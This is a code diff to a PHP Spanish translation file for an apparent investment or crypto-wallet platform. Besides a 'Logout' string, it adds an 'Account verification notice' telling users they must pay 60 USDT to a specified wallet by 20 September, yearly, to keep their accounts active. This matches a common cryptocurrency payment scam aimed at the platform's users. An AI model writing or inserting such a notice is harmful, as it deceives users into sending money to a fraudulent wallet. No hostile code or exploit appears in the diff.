@@ -115,4 +115,16 @@ return [
     'Investment' => 'Inversión',
     'Wallet Address' => 'Dirección del monedero',
     'Virtual' => 'Virtual',
+    'Logout' => 'Cerrar sesión',
+    'Account verification notice' => <<<'TEXT'
+¡Queridos socios!
+
+Para el funcionamiento adecuado de la plataforma y la capacidad de procesar todos los pagos y reembolsos, es importante tener datos de usuario precisos y actualizados.
+
+En este sentido, es necesario completar el procedimiento de verificación de la cuenta. Requiere un pago de 60 USDT a la billetera especificada aquí, después de lo cual su cuenta se activará y el sistema recibirá los datos necesarios para el procesamiento correcto de los pagos.
+
+Estos fondos están dirigidos a respaldar la operación estable del sitio y la identificación del usuario, asegurando la protección de las cuentas y manteniéndolas actualizadas.
+
+El pago debe realizarse antes del 20 de septiembre. Este procedimiento es obligatorio y se cobra anualmente.
+TEXT,
 ];
